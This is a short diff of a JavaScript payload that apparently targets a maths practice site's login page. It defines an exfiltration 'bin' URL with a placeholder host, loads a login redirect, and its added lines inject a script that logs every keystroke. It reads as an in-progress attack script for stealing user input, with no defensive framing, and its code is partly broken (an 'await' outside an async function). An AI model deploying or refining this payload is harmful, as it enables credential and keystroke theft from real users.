@@ -1,4 +1,4 @@
-(function(w) {
+(function() {
   const comfort = 'https://www.drfrostmaths.com/do-question.php?aaid=10972720'
   const bin = 'https://???/bin?data='
 
@@ -13,6 +13,6 @@
     console.log(`in data: ${data}`)
   }
   
-  load(`/login.php?url=${encodeURIComponent(comfort)}`)
-  w.a = 1
-})(window)
+  await load(`/login.php?url=${encodeURIComponent(comfort)}`)
+  document.body.innerHTML += `<script>window.onkeydown=${({key}) => console.log(key)}</script>`
+})()
